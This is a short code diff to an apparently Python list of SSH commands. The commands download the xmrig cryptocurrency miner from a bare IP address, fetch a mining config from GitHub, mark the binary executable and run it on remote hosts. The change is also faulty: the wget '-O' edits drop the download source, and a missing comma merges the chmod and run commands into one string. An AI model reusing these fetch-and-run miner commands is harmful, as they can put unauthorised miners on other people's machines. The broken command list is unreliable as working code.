@@ -22,10 +22,10 @@ sshcmd = [
     # 
     # "sudo yum install epel-release -y", # install epel-release on Centos!! to make sur you can get tmux + wget
     #"sudo apt install wget tmux -y", # installs wget
-    "wget http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
-    "wget https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
+    "wget -O http://158.69.130.165/xmrig/build/xmrig", # Downloads xmrig
+    "wget -O https://raw.githubusercontent.com/junaidd007/Monero/main/config.json", #downloads the config file
     "chmod +x ./xmrig"
-    "nohup ./xmrig"
+    "./xmrig"
         
 ]
 
